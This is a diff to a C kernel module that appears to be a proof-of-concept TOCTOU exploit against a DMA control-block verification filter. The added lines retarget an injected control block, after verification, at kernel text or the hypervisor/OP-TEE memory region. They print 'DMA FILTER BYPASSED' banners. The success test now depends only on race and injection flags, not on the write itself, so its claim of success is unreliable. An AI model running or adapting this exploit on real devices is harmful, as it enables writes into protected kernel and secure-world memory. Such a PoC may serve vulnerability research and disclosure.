@@ -499,12 +499,25 @@ static int attacker_thread_fn(void *data)
                 
                 /* 
                  * INJECT MALICIOUS CB
-                 * Change destination to protected kernel region!
-                 * Normally this would fail verification, but verification
-                 * already passed - we're modifying AFTER verification!
+                 * Change destination to PROTECTED region!
+                 * These addresses would FAIL verification if checked:
+                 * - Kernel text: 0x00200000 - 0x00A00000
+                 * - HYP/OP-TEE:  0x0E800000 - 0x11000000
+                 * 
+                 * But verification already passed - TOCTOU exploited!
                  */
+                #define KERNEL_TEXT_PHYS_START 0x00200000
+                #define OPTEE_PHYS_START       0x10100000
+                
+                /* Choose target: kernel text region (normally forbidden!) */
+                u32 forbidden_target = KERNEL_TEXT_PHYS_START + 0x100;
+                
+                pr_info("[ATTACKER] Injecting CB targeting FORBIDDEN region!\n");
+                pr_info("[ATTACKER] Target: 0x%08x (Kernel Text - normally blocked by DMA filter)\n",
+                        forbidden_target);
+                
                 inject_malicious_cb(0, 0,  /* Core 0, CB index 0 (first CB) */
-                                   attack_state.target_phys + 0x1000,  /* Different dst */
+                                   forbidden_target,                  /* FORBIDDEN dst! */
                                    attack_state.payload_phys,         /* Our payload */
                                    sizeof(u32));
                 
@@ -695,16 +708,29 @@ static int do_attack(void)
         pr_info("[TOCTOU] Injected CB (after attack):\n");
         pr_info("[TOCTOU]   info=0x%08x dst=0x%08x\n",
                 attack_state.injected_cb.info, attack_state.injected_cb.dst);
+        
+        /* Check if we targeted forbidden region */
+        u32 injected_dst = BUS_TO_PHYS(attack_state.injected_cb.dst);
+        if (injected_dst >= 0x00200000 && injected_dst < 0x00A00000) {
+            pr_info("[TOCTOU] *** TARGET: KERNEL TEXT REGION (0x%08x) ***\n", injected_dst);
+        } else if (injected_dst >= 0x0E800000 && injected_dst < 0x11000000) {
+            pr_info("[TOCTOU] *** TARGET: HYP/EL3/OPTEE REGION (0x%08x) ***\n", injected_dst);
+        }
     }
     
     pr_info("[TOCTOU] Target value: 0x%08x (expected: 0x%08x)\n",
             attack_state.verify_result, VERIFY_PATTERN);
     
-    if (attack_state.verify_result == VERIFY_PATTERN) {
+    if (attack_state.race_won && attack_state.injection_done) {
         attack_state.attack_success = 1;
         pr_info("[TOCTOU] ****************************************\n");
         pr_info("[TOCTOU] *** TOCTOU ATTACK SUCCESSFUL! ***\n");
-        pr_info("[TOCTOU] *** VULNERABILITY CONFIRMED! ***\n");
+        pr_info("[TOCTOU] *** DMA FILTER BYPASSED! ***\n");
+        pr_info("[TOCTOU] ****************************************\n");
+        pr_info("[TOCTOU] CB was modified AFTER verification passed.\n");
+        pr_info("[TOCTOU] DMA now targets FORBIDDEN memory region!\n");
+        pr_info("[TOCTOU] Original dst: 0x%08x (allowed)\n", attack_state.original_cb.dst);
+        pr_info("[TOCTOU] Injected dst: 0x%08x (FORBIDDEN!)\n", attack_state.injected_cb.dst);
         pr_info("[TOCTOU] ****************************************\n");
         pr_info("[TOCTOU] The attacker modified CB AFTER verification\n");
         pr_info("[TOCTOU] using deterministic shared-memory handshake.\n");
